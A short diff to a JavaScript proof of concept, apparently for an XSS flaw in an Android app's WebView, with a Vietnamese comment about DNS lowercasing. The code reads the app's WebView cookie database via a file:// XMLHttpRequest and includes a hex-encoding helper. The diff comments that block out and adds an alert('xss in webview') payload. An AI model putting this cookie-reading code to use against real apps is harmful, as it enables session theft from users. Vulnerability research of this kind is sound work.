@@ -5,6 +5,7 @@ function toHex(str) { //request DNS sẽ lowercase tất cả ký tự nên nh�
     }
     return result;
 }
+/*
 var xhr = new XMLHttpRequest();
 xhr.onreadystatechange = function() {
     if (xhr.readyState == XMLHttpRequest.DONE) {
@@ -13,3 +14,5 @@ xhr.onreadystatechange = function() {
 }
 xhr.open('GET', 'file:///data/data/com.inet.evernet/app_webview/Default/Cookies', true);
 xhr.send(null);
+*/
+alert("xss in webview");
